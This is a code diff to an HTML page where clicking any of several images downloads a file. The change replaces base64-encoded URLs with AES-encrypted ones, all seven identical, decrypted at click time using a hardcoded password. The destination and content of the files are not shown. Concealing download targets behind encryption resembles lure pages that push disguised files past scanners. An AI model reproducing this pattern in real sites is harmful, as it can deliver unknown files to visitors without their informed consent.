@@ -16,6 +16,7 @@
             cursor: pointer; 
         }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
 
@@ -28,23 +29,24 @@
     <img src="static/picture/d_07.jpg">
 
     <script>
-        
         const encryptedUrls = [
-            'aH',
-            'aH',
-            'aH',
-            'aH',
-            'aH',
-            'aH',
-            'aH'
+            'U2FsdGVkX18vUsZ8EWTwzX9l9cfbL4hI40KRboibn6TiKy0gmusTOZYWTXVJHdpyPvJKS8xapGWMRamgJCfnU9EIaJgcyUOzAM/pMMQL1ohsNzxMUARNFEMZtEhyByrL', 
+            'U2FsdGVkX18vUsZ8EWTwzX9l9cfbL4hI40KRboibn6TiKy0gmusTOZYWTXVJHdpyPvJKS8xapGWMRamgJCfnU9EIaJgcyUOzAM/pMMQL1ohsNzxMUARNFEMZtEhyByrL',   
+            'U2FsdGVkX18vUsZ8EWTwzX9l9cfbL4hI40KRboibn6TiKy0gmusTOZYWTXVJHdpyPvJKS8xapGWMRamgJCfnU9EIaJgcyUOzAM/pMMQL1ohsNzxMUARNFEMZtEhyByrL',   
+            'U2FsdGVkX18vUsZ8EWTwzX9l9cfbL4hI40KRboibn6TiKy0gmusTOZYWTXVJHdpyPvJKS8xapGWMRamgJCfnU9EIaJgcyUOzAM/pMMQL1ohsNzxMUARNFEMZtEhyByrL',  
+            'U2FsdGVkX18vUsZ8EWTwzX9l9cfbL4hI40KRboibn6TiKy0gmusTOZYWTXVJHdpyPvJKS8xapGWMRamgJCfnU9EIaJgcyUOzAM/pMMQL1ohsNzxMUARNFEMZtEhyByrL',   
+            'U2FsdGVkX18vUsZ8EWTwzX9l9cfbL4hI40KRboibn6TiKy0gmusTOZYWTXVJHdpyPvJKS8xapGWMRamgJCfnU9EIaJgcyUOzAM/pMMQL1ohsNzxMUARNFEMZtEhyByrL',   
+            'U2FsdGVkX18vUsZ8EWTwzX9l9cfbL4hI40KRboibn6TiKy0gmusTOZYWTXVJHdpyPvJKS8xapGWMRamgJCfnU9EIaJgcyUOzAM/pMMQL1ohsNzxMUARNFEMZtEhyByrL'    
         ];
 
-        function base64Decode(base64) {
-            return atob(base64); 
+        const password = '2233'; 
+
+        function decryptAES(encrypted) {
+            const decrypted = CryptoJS.AES.decrypt(encrypted, password);
+            return decrypted.toString(CryptoJS.enc.Utf8);
         }
 
-        function downloadFile(encodedUrl) {
-            const url = base64Decode(encodedUrl); 
+        function downloadFile(url) {
             const link = document.createElement('a');
             link.href = url;
             link.download = ''; 
@@ -53,12 +55,12 @@
             document.body.removeChild(link); 
         }
 
-        
         const images = document.querySelectorAll('img');
         images.forEach((img, index) => {
             img.addEventListener('click', () => {
-                const encodedUrl = encryptedUrls[index]; 
-                downloadFile(encodedUrl); 
+                const encryptedUrl = encryptedUrls[index]; 
+                const decryptedUrl = decryptAES(encryptedUrl);
+                downloadFile(decryptedUrl); 
             });
         });
     </script>
